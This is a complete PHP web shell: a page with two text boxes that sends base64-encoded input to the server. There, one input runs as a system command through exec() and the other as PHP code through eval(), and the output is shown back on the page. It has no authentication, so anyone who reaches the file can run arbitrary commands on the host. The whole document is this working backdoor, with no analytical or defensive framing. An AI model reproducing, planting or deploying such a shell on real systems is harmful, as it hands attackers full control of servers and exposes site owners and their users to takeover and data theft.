<?php

error_reporting(E_ALL);

$ex = trim(base64_decode(@$_POST['ex']));
$ev = trim(base64_decode(@$_POST['ev']));
var_dump($ex);
var_dump($ev);
if ($ex) {
	exec($ex, $result);
	$output = print_r($result, true);
} elseif ($ev) {
	$output = eval($ev);
}
?>
<html>
<head></head>
<body>
<div>
<pre><?php echo @$output; ?></pre>
</div>
<div>
<div>exec:</div>
<textarea id="ex"><?php echo htmlspecialchars(base64_decode(@$_POST['ex'])); ?></textarea>
<div><button onclick="send()">exec</button></div>
<div>php:</div>
<textarea id="ev"><?php echo htmlspecialchars(base64_decode(@$_POST['ev'])); ?></textarea>
<div><button onclick="send()">eval</button></div>
</div>
<form method="post" id="myform">
<input type="hidden" name="ex" id="ex64"/>
<input type="hidden" name="ev" id="ev64"/>
</form>
<script>
function send() {
	document.getElementById('ex64').value = base64_encode(document.getElementById('ex').value);
	document.getElementById('ev64').value = base64_encode(document.getElementById('ev').value);
	document.getElementById("myform").submit();
}

function base64_encode( data ) {	// Encodes data with MIME base64
	// 
	// +   original by: Tyler Akins (http://rumkin.com)
	// +   improved by: Bayron Guevara

	var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	var o1, o2, o3, h1, h2, h3, h4, bits, i=0, enc='';

	do { // pack three octets into four hexets
		o1 = data.charCodeAt(i++);
		o2 = data.charCodeAt(i++);
		o3 = data.charCodeAt(i++);

		bits = o1<<16 | o2<<8 | o3;

		h1 = bits>>18 & 0x3f;
		h2 = bits>>12 & 0x3f;
		h3 = bits>>6 & 0x3f;
		h4 = bits & 0x3f;

		// use hexets to index into b64, and append result to encoded string
		enc += b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
	} while (i < data.length);

	switch( data.length % 3 ){
		case 1:
			enc = enc.slice(0, -2) + '==';
		break;
		case 2:
			enc = enc.slice(0, -1) + '=';
		break;
	}

	return enc;
}
</script>
</body>
</html>
